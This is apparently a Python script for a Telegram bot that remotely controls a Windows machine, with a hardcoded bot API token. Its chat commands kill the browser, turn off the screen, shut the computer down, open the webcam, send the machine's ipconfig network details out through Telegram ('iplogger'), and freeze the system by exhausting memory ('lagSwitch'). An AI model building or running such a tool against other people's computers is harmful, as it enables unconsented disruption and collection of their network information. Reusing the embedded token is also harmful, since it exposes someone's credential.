from email import message
import telebot
import numpy as np
import pyautogui
import webbrowser
import os
import sys
import win32gui
import win32con
import cv2
import subprocess
import ctypes
import os
import shutil
import ctypes.wintypes
import time
from itertools import count
bot = telebot.TeleBot('5323047396:AAHBV5nqYBGqa5vUEAOS5BtOXZIl3LEpXVk') # here you paste your bot's API, which you can get in "BotFather" bot
@bot.message_handler(content_types=['text','document', 'audio'])
 
def get_text_messages(message):
    # bot's interface
    bot.send_message(message.from_user.id, "Commands\n\n\n"             "1 - close browser\n\n"       "2 - screenOff function\n\n"        "3 - shutdown computer\n\n"       "4 - turn off the camera\n\n"       "5 - iplogger\n\n"       "6 - lagSwitch\n\n"       "7 - exit")
    
    def screenOff():
        return win32gui.SendMessage(win32con.HWND_BROADCAST,
                            win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)
     
    global chatId    
    chatId = message.chat.id 
    
#   here you can create your own function
        
    if message.text == "1":
        try:
            os.system("taskkill /im opera.exe /f")
        except:
            print("sww")    
        
    if message.text == "2":
        try:
            screenOff()
        except:
            print("sww") 
    if message.text == "3":
        try:
            os.system('shutdown -s')
        except:
            print("sww")  
    if message.text == "4":
        try:
            cam = cv2.VideoCapture(0)
            while True:
                    ret, img = cam.read()
                    cv2.imshow("camera", img)
                    if cv2.waitKey(10) == 27:
                        break
            cam.release()
            cv2.destroyAllWindows()
        except:
            print("sww")
    if message.text == "5":
        try:
            encoding = os.device_encoding(1) or ctypes.windll.kernel32.GetOEMCP()
            text = subprocess.check_output('ipconfig', encoding=encoding)
            bot.send_message(message.from_user.id, text)
        except:
            print("sww")
    if message.text == "6":
        try:
            list(count(0))
        except:
            print("sww")
    if message.text == "7":
        os.abort()
                                             
bot.polling(none_stop=True, interval=0)
